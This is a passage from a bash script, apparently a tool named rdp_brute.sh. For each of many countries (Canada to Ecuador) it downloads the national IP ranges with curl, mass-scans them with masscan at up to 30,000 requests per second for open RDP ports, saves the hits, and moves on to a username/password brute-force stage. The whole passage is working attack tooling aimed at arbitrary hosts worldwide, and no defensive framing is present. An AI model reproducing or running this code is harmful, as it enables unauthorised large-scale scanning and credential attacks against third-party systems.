echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "36" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CANADA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Canada://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "37" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CAYMAN+ISLANDS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Cayman Islands://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "38" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CENTRAL+AFRICAN+REPUBLIC |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Central African Republic://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "39" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CHILE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Chile://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "40" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CHINA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/China://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "41" ]; then
curl http://services.ce3c.be/ciprg/?countrys=COLOMBIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Colombia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "42" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CONGO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Congo://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "43" ]; then
curl http://services.ce3c.be/ciprg/?countrys=COOK+ISLANDS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Cook Islands://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "44" ]; then
curl http://services.ce3c.be/ciprg/?countrys=COSTA+RICA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Costa Rica://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "45" ]; then
curl http://services.ce3c.be/ciprg/?countrys=COTE+D%27IVOIRE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Cote D'ivoire://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "46" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CROATIA+%28LOCAL+NAME%3A+HRVATSKA%29%2C |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Croatia (LOCAL Name: Hrvatska)://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "47" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CUBA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Cuba://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "48" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CYPRUS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Cyprus://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "49" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CZECH+REPUBLIC |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Czech Republic://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "50" ]; then
curl http://services.ce3c.be/ciprg/?countrys=DENMARK |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Denmark://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "51" ]; then
curl http://services.ce3c.be/ciprg/?countrys=DJIBOUTI |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Djibouti://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "52" ]; then
curl http://services.ce3c.be/ciprg/?countrys=DOMINICAN+REPUBLIC |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Dominican Republic://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "53" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ECUADOR |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Ecuador://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
